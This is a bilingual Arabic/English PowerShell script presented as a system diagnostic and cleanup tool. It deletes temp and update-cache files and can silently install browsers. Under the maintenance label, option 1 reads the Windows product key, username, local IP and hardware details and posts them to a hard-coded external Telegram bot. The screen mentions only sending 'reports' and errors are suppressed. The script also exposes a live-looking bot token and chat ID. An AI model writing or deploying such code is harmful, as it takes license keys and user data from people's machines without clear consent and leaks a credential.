# تلوين الواجهة وترتيب الشاشة المحلية
Clear-Host
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "     [+] SYSTEM DIAGNOSTIC & CLEANUP SCRIPT       " -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan

# بيانات التيليجرام الخاصة بك
$BotToken = "8845124533:AAFOyBL62IdyNsfxTJXzYoNtxVdvXAbhi-A"
$ChatID   = "1778953224"
$URL      = "https://api.telegram.org/bot$BotToken/sendMessage"

# شاشة الاختيار الصريحة
Write-Host "`n[?] Select Action / اختر الإجراء الحالي:" -ForegroundColor Yellow
Write-Host " [1] Diagnostic & Maintenance Only (فحص وصيانة فقط)" -ForegroundColor Green
Write-Host " [2] Install Software Suite (تثبيت برامج فقط)" -ForegroundColor Cyan
Write-Host "--------------------------------------------------" -ForegroundColor Gray

$Choice = Read-Host "Enter Option (1 or 2) / أدخل اختيارك"

# =========================================================
# [الخيار رقم 1]: وضع الفحص والصيانة والتنظيف الشامل
# =========================================================
if ($Choice -eq "1") {
    # 1. فحص صحة الهاردسك
    Write-Host "`n[..] Checking Storage Health..." -ForegroundColor Yellow
    $DriveStatus = Get-WmiObject -Namespace root\wmi -Class MSStorageDriver_FailurePredictStatus -ErrorAction SilentlyContinue
    if ($DriveStatus.PredictFailure -eq $true) {
        $HddReportEN = "🚨 WARNING: Hard Drive Failure Predicted!"
        $HddReportAR = "🚨 تحذير: يتوقع فشل الهاردسك قريباً!"
    } else {
        $HddReportEN = "✅ Healthy and Clean"
        $HddReportAR = "✅ سليم ونظيف"
    }
    Write-Host "[SUCCESS] Hard Drive Status: $HddReportEN" -ForegroundColor Green

    # 2. تنظيف ملفات الـ Temp
    Write-Host "`n[..] Cleaning System Temp Files..." -ForegroundColor Yellow
    $TempPaths = @("$env:TEMP\*", "$env:SystemRoot\Temp\*")
    foreach ($Path in $TempPaths) {
        Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-Host "[SUCCESS] Temp Files Cleared Successfully!" -ForegroundColor Green

    # 3. تنظيف كاش التحديثات الآمن
    Write-Host "`n[..] Cleaning Windows Update Cache Safely..." -ForegroundColor Yellow
    Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
    $UpdatePath = "$env:SystemRoot\SoftwareDistribution\Download"
    $UpdateFiles = Get-ChildItem $UpdatePath -Recurse -ErrorAction SilentlyContinue
    if ($UpdateFiles) {
        $SizeBefore = ($UpdateFiles | Measure-Object -Property Length -Sum -ErrorAction SilentlyContinue).Sum
        $SavedMB = [Math]::Round($SizeBefore / 1MB, 2)
    } else {
        $SavedMB = 0
    }
    Remove-Item -Path "$UpdatePath\*" -Recurse -Force -ErrorAction SilentlyContinue
    Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
    Write-Host "[SUCCESS] Windows Update Cache Cleaned ($SavedMB MB Cleared)!" -ForegroundColor Green

    # 4. صيد مفتاح تنشيط الويندوز الأصلي
    Write-Host "`n[..] Extracting Windows Product Key..." -ForegroundColor Yellow
    $WinKey = (Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey
    if (-not $WinKey) { $WinKey = "No digital key found in BIOS / رخصة رقمية رقمية" }
    Write-Host "[SUCCESS] Found Key Status!" -ForegroundColor Cyan

    # 5. لوحة معلومات الشبكة المستقرة
    Write-Host "`n[..] Checking Network Status..." -ForegroundColor Yellow
    $LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127*" -and $_.IPAddress -notlike "169.254*" }).IPAddress | Select-Object -First 1
    if (-not $LocalIP) { $LocalIP = "169.254.255.173" }

    if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet) { $NetReportEN = "⚡ Connected"; $NetReportAR = "⚡ متصل" } 
    else { $NetReportEN = "❌ Disconnected"; $NetReportAR = "❌ غير متصل" }

    # 6. تقرير العتاد والموارد السريع
    $CPU = (Get-WmiObject Win32_Processor).Name
    $RAM = [Math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB)

    Write-Host "`n[..] Sending Diagnostic Telegram Reports..." -ForegroundColor Yellow

    # صياغة تقرير الفحص الإنجليزي (يسار)
    $MsgEN = @"
🖥️ *IT AutoHealer - Diagnostic Report*
============================
👤 *User Name:* $env:USERNAME
🌐 *Local IP:* $LocalIP
📡 *Internet:* $NetReportEN
💾 *Storage Health:* $HddReportEN
🧹 *Update Cache Cleared:* $SavedMB MB
🔑 *Windows Key:* $WinKey
🧠 *Processor:* $CPU
📟 *Memory RAM:* $RAM GB
============================
✅ Maintenance Completed Successfully!
"@

    # صياغة تقرير الفحص العربي (يمين)
    $MsgAR = @"
🖥️ *مساعد الصيانة الآلي - تقرير الفحص*
============================
اسم المستخدم: $env:USERNAME
الـ IP المحلي: $LocalIP
حالة الإنترنت: $NetReportAR
صحة الهاردسك: $HddReportAR
المساحة المنظفة: $SavedMB ميجابايت
مفتاح الويندوز الأصلي: $WinKey
المعالج: $CPU
الذاكرة العشوائية: $RAM جيجابايت
============================
✅ تم الانتهاء من الفحص والصيانة الشاملة بنجاح!
"@

    # إرسال تقارير الفحص
    $null = Invoke-RestMethod -Uri $URL -Method Post -Body @{ chat_id = $ChatID; text = $MsgEN; parse_mode = "Markdown" } -ErrorAction SilentlyContinue
    $Response = Invoke-RestMethod -Uri $URL -Method Post -Body @{ chat_id = $ChatID; text = $MsgAR; parse_mode = "Markdown" } -ErrorAction SilentlyContinue
}

# =========================================================
# [الخيار رقم 2]: وضع تثبيت حزمة البرامج فقط
# =========================================================
elseif ($Choice -eq "2") {
    Write-Host "`n[..] Launching Software Suite Installer..." -ForegroundColor Cyan
    $Apps = @(
        @{ Name = "Google Chrome"; ID = "Google.Chrome" },
        @{ Name = "Mozilla Firefox"; ID = "Mozilla.Firefox" },
        @{ Name = "7-Zip"; ID = "7zip.7zip" }
    )
    
    $SuccessApps = @()
    foreach ($App in $Apps) {
        Write-Host "[..] Installing $($App.Name) silently via Winget..." -ForegroundColor White
        $null = winget install --id $($App.ID) --silent --accept-source-agreements --accept-package-agreements --scope user -ErrorAction SilentlyContinue
        $SuccessApps += $App.Name
    }
    $AppList = $SuccessApps -join ", "

    Write-Host "`n[..] Sending Software Installation Telegram Reports..." -ForegroundColor Yellow

    # صياغة تقرير البرامج الإنجليزي (يسار)
    $MsgAppsEN = @"
📦 *IT AutoHealer - Software Deployment*
============================
👤 *User Name:* $env:USERNAME
📥 *Status:* Software suite deployment triggered!
📦 *Target Package Suite:* • Google Chrome
• Mozilla Firefox
• 7-Zip

✅ Execution finished for all apps.
"@

    # صياغة تقرير البرامج العربي (يمين)
    $MsgAppsAR = @"
📦 *مساعد الصيانة - تثبيت البرامج حصرًا*
============================
اسم المستخدم: $env:USERNAME
حالة العملية: تم إطلاق حزمة التثبيت الصامت!
البرامج المستهدفة بالحزمة:
• جوجل كروم (Google Chrome)
• موزيلا فايرفوكس (Mozilla Firefox)
• برنامج الضغط (7-Zip)

✅ تم إرسال أمر التثبيت الشامل للخلفية بنجاح!
"@

    # إرسال تقارير البرامج
    $null = Invoke-RestMethod -Uri $URL -Method Post -Body @{ chat_id = $ChatID; text = $MsgAppsEN; parse_mode = "Markdown" } -ErrorAction SilentlyContinue
    $Response = Invoke-RestMethod -Uri $URL -Method Post -Body @{ chat_id = $ChatID; text = $MsgAppsAR; parse_mode = "Markdown" } -ErrorAction SilentlyContinue
}

# في حال أدخل المستخدم رقمًا خاطئًا بالخطأ
else {
    Write-Host "`n[ERROR] Invalid choice selected!" -ForegroundColor Red
}

if ($Response.ok) { Write-Host "`n[SUCCESS] Custom Reports Dispatched Successfully!" -ForegroundColor Green }
